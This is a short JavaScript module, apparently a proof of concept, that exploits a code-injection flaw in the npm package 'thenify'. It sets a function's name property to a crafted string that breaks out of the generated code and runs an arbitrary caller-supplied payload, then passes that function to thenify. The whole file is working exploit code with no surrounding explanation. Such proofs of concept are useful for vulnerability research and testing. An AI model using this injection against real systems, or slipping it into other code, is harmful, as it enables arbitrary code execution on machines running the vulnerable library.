function exploitFunction(payload) {
    function cur() {}
    Object.defineProperty(cur, "name", {
        value: "fake() {" + payload + ";})();(function(){//"
    });
    const a = require("thenify");
    a(cur);
}

module.exports = { exploitFunction };